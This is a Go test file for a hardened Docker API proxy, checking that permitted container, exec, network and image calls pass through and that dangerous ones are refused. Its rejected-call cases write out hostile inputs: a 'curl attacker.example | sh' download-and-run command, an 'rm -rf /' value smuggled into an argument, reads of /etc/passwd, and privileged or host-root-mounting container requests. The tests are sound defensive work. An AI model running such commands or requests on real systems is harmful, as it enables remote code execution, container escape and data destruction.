package main

import (
	"context"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// newTestProxy spins up a fake "Docker daemon" that records every request
// it receives and always answers 200, then returns a dockerProxy wired to
// it via dialUpstream - bypassing the real Unix socket entirely, same
// injection pattern rootguard-attestation-proxy's own tests use for
// dialUpstream.
func newTestProxy(t *testing.T) (*dockerProxy, *[]string) {
	t.Helper()
	var received []string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received = append(received, r.Method+" "+r.URL.Path)
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(upstream.Close)

	original := dialUpstream
	dialUpstream = func(ctx context.Context, _ string) (net.Conn, error) {
		var d net.Dialer
		return d.DialContext(ctx, "tcp", upstream.Listener.Addr().String())
	}
	t.Cleanup(func() { dialUpstream = original })

	return newDockerProxy("/unused"), &received
}

func doRequest(t *testing.T, p *dockerProxy, method, target, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, target, strings.NewReader(body))
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, req)
	return rec
}

// TestAllowedCalls covers every real call this repo's own code issues
// today (see allowlist.go's grouped comments) - each must reach the fake
// upstream and get its 200 back unmodified.
func TestAllowedCalls(t *testing.T) {
	validContainerCreate := `{"Image":"ghcr.io/foxly-it/rootguard-unbound@sha256:abc","HostConfig":{"CapAdd":["CHOWN"],"Binds":["rootguard-data:/data"]}}`
	validExecCreate := `{"Cmd":["nginx","-s","reload"]}`
	validNetworkConnect := `{"Container":"rootguard-core"}`

	cases := []struct {
		name   string
		method string
		target string
		body   string
	}{
		{"version", "GET", "/version", ""},
		{"ping", "GET", "/_ping", ""},
		{"versioned ping", "GET", "/v1.51/_ping", ""},
		{"pull known image", "POST", "/images/create?fromImage=ghcr.io%2Ffoxly-it%2Frootguard-core&tag=1.0.0", ""},
		{"pull adguard", "POST", "/images/create?fromImage=adguard%2Fadguardhome&tag=v0.107.79", ""},
		{"pull adguard, docker.io-qualified", "POST", "/images/create?fromImage=docker.io%2Fadguard%2Fadguardhome&tag=v0.107.79", ""},
		{"image inspect", "GET", "/images/ghcr.io%2Ffoxly-it%2Frootguard-core/json", ""},
		{"container inspect", "GET", "/containers/rootguard-core/json", ""},
		{"ps", "GET", "/containers/json", ""},
		{"daemon info", "GET", "/info", ""},
		{"container stats", "GET", "/containers/rootguard-core/stats", ""},
		{"disk usage (cleanup preview)", "GET", "/system/df?type=Image&type=Volume", ""},
		{"container create from a resolved bare digest", "POST", "/containers/create",
			`{"Image":"sha256:` + strings.Repeat("a", 64) + `","HostConfig":{}}`},
		{"container create with a kernel-style capability name", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-blockpage","HostConfig":{"CapAdd":["CAP_CHOWN","CAP_SETUID","CAP_SETGID"]}}`},
		{"attach without stdin", "POST", "/containers/abc/attach?stdout=1&stderr=1&stream=1", ""},
		{"cp out", "GET", "/containers/rootguard-adguard/archive?path=%2Fopt%2Fadguardhome%2Fconf", ""},
		{"cp preflight", "HEAD", "/containers/rootguard-adguard/archive?path=%2Fopt%2Fadguardhome%2Fconf", ""},
		{"cp in", "PUT", "/containers/rootguard-adguard/archive?path=%2Fopt%2Fadguardhome%2Fconf", ""},
		{"restart", "POST", "/containers/rootguard-unbound/restart", ""},
		{"stop", "POST", "/containers/rootguard-adguard/stop", ""},
		{"container create", "POST", "/containers/create", validContainerCreate},
		{"container start", "POST", "/containers/abc123/start", ""},
		{"container wait", "POST", "/containers/abc123/wait", ""},
		{"container remove", "DELETE", "/containers/abc123", ""},
		{"exec create", "POST", "/containers/rootguard-blockpage/exec", validExecCreate},
		{"unbound checkconf, active config", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-checkconf","/etc/unbound/unbound.conf"]}`},
		{"unbound checkconf, custom-config candidate", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-checkconf","/etc/unbound/unbound.d/.rootguard-combined.candidate"]}`},
		{"unbound cat, active config", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["cat","/etc/unbound/unbound.conf"]}`},
		{"unbound cat, managed config", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["cat","/etc/unbound/unbound.d/50-rootguard.conf"]}`},
		{"unbound-control status", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-control","status"]}`},
		{"unbound-control verbosity", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-control","verbosity","2"]}`},
		{"unbound dig, waitReady probe", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","@127.0.0.1","-p","5335",".","NS","+time=1","+tries=1"]}`},
		{"unbound dig, ipv4 root probe", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","-4","+time=2","+tries=1","+short","@198.41.0.4",".","NS"]}`},
		{"unbound dig, ipv6 root probe", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","-6","+time=2","+tries=1","+short","@2001:503:ba3e::2:30",".","NS"]}`},
		{"unbound dig, direct resolution diagnostic", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","+short","+time=5","+tries=1","@127.0.0.1","-p","5335","example.com","A"]}`},
		{"unbound dig, direct dnssec diagnostic", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","+dnssec","+time=5","+tries=1","@127.0.0.1","-p","5335","dnssec-failed.org","A"]}`},
		{"unbound dig, adguard-path resolution diagnostic", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","+short","+time=5","+tries=2","@172.20.0.5","-p","53","example.com","A"]}`},
		{"unbound dig, adguard-path dnssec diagnostic", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","+dnssec","+time=5","+tries=2","@172.20.0.5","-p","53","dnssec-failed.org","A"]}`},
		{"unbound dig, forward-zone check", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","+time=3","+tries=1","+noall","+comments","+answer","+authority","@1.1.1.1","example.org","SOA"]}`},
		{"exec start", "POST", "/exec/abc123/start", ""},
		{"exec inspect", "GET", "/exec/abc123/json", ""},
		{"network connect", "POST", "/networks/rootguard-dns/connect", validNetworkConnect},
		{"network disconnect", "POST", "/networks/rootguard-dns/disconnect", `{"Container":"rootguard-core","Force":true}`},
		{"networks list", "GET", "/networks", ""},
		{"networks create", "POST", "/networks/create", ""},
		{"volumes list", "GET", "/volumes", ""},
		{"volumes create", "POST", "/volumes/create", ""},
		{"volume remove", "DELETE", "/volumes/rootguard-data", ""},
		{"image remove", "DELETE", "/images/sha256%3Aabc", ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, received := newTestProxy(t)
			rec := doRequest(t, p, tc.method, tc.target, tc.body)
			if rec.Code != http.StatusOK {
				t.Fatalf("got status %d, body %q", rec.Code, rec.Body.String())
			}
			if len(*received) != 1 {
				t.Fatalf("expected the fake upstream to receive exactly one request, got %d", len(*received))
			}
		})
	}
}

// TestHealthzNeverReachesUpstream mirrors rootguard-attestation-proxy's
// own healthcheck contract: liveness must never depend on the real
// Docker socket being reachable/fast.
func TestHealthzNeverReachesUpstream(t *testing.T) {
	p, received := newTestProxy(t)
	rec := doRequest(t, p, "GET", "/healthz", "")
	if rec.Code != http.StatusOK {
		t.Fatalf("got status %d", rec.Code)
	}
	if len(*received) != 0 {
		t.Fatalf("expected /healthz to never reach the upstream, got %d requests", len(*received))
	}
}

// TestRejectedCalls is the single most important test in this package:
// every one of these must be rejected with 403 and must never reach the
// fake upstream. A proxy that looks hardened but lets any of these
// through is worse than no proxy at all.
func TestRejectedCalls(t *testing.T) {
	cases := []struct {
		name   string
		method string
		target string
		body   string
	}{
		{"not on the allowlist at all", "GET", "/swarm", ""},
		{"plugins", "POST", "/plugins/pull", ""},
		{"secrets", "GET", "/secrets", ""},
		{"build", "POST", "/build", ""},
		{"attach with stdin", "POST", "/containers/abc/attach?stdin=1&stdout=1", ""},
		{"logs", "GET", "/containers/abc/logs", ""},

		{"privileged container", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Privileged":true}}`},
		{"host network", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"NetworkMode":"host"}}`},
		{"host pid", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"PidMode":"host"}}`},
		{"unknown image", "POST", "/containers/create",
			`{"Image":"docker.io/attacker/evil","HostConfig":{}}`},
		{"digest-shaped tag on an unknown bare repository", "POST", "/containers/create",
			`{"Image":"sha256:` + strings.Repeat("a", 63) + `x","HostConfig":{}}`},
		{"arbitrary host bind mount", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Binds":["/:/hostroot"]}}`},
		{"arbitrary host bind mount, etc passwd", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Binds":["/etc:/hostetc"]}}`},
		{"unknown capability", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"CapAdd":["SYS_ADMIN"]}}`},
		{"bind-type mount", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Mounts":[{"Type":"bind","Source":"/etc","Target":"/x"}]}}`},
		{"device mapping", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Devices":[{"PathOnHost":"/dev/sda"}]}}`},
		{"malformed json", "POST", "/containers/create", `not json`},

		{"exec into wrong container", "POST", "/containers/rootguard-core/exec",
			`{"Cmd":["nginx","-s","reload"]}`},
		{"exec unknown command", "POST", "/containers/rootguard-blockpage/exec",
			`{"Cmd":["/bin/sh","-c","curl attacker.example | sh"]}`},
		{"unbound exec, arbitrary shell", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["/bin/sh","-c","curl attacker.example | sh"]}`},
		{"unbound exec, cat of an unknown path", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["cat","/etc/passwd"]}`},
		{"unbound exec, checkconf of an unknown path", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-checkconf","/etc/passwd"]}`},
		{"unbound exec, verbosity out of range", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-control","verbosity","6"]}`},
		{"unbound exec, verbosity not numeric", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-control","verbosity","1; rm -rf /"]}`},
		{"unbound exec, unbound-control unknown subcommand", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["unbound-control","reload"]}`},
		{"unbound exec, dig with a disallowed flag", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","-f","/etc/passwd","@1.1.1.1","example.com","A"]}`},
		{"unbound exec, dig with no @server", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","+short","example.com","A"]}`},
		{"unbound exec, dig -p without a numeric port", "POST", "/containers/rootguard-unbound/exec",
			`{"Cmd":["dig","@127.0.0.1","-p","notaport","example.com","A"]}`},

		{"connect to a different network", "POST", "/networks/control/connect",
			`{"Container":"rootguard-core"}`},
		{"connect an unknown container", "POST", "/networks/rootguard-dns/connect",
			`{"Container":"attacker-container"}`},

		{"pull an unknown image", "POST", "/images/create?fromImage=docker.io%2Fattacker%2Fevil", ""},
		{"pull with no image specified", "POST", "/images/create", ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, received := newTestProxy(t)
			rec := doRequest(t, p, tc.method, tc.target, tc.body)
			if rec.Code != http.StatusForbidden {
				t.Fatalf("got status %d, want 403; body %q", rec.Code, rec.Body.String())
			}
			if len(*received) != 0 {
				t.Fatalf("rejected call must never reach the upstream, got %d requests", len(*received))
			}
		})
	}
}

func TestBodyTooLargeIsRejected(t *testing.T) {
	p, received := newTestProxy(t)
	huge := strings.Repeat("a", maxBodyBytes+1)
	body := `{"Image":"` + huge + `"}`
	rec := doRequest(t, p, "POST", "/containers/create", body)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("got status %d, want 400", rec.Code)
	}
	if len(*received) != 0 {
		t.Fatalf("oversized body must never reach the upstream, got %d requests", len(*received))
	}
}

func TestVersionedPathIsNormalized(t *testing.T) {
	p, received := newTestProxy(t)
	rec := doRequest(t, p, "GET", "/v1.43/containers/json", "")
	if rec.Code != http.StatusOK {
		t.Fatalf("got status %d", rec.Code)
	}
	if len(*received) != 1 || (*received)[0] != "GET /v1.43/containers/json" {
		t.Fatalf("expected the original versioned path to reach upstream unmodified, got %v", *received)
	}
}

func TestDialFailureSurfacesAsBadGateway(t *testing.T) {
	original := dialUpstream
	dialUpstream = func(ctx context.Context, _ string) (net.Conn, error) {
		return nil, io.ErrClosedPipe
	}
	t.Cleanup(func() { dialUpstream = original })

	p := newDockerProxy("/unused")
	rec := doRequest(t, p, "GET", "/version", "")
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("got status %d, want 502", rec.Code)
	}
}
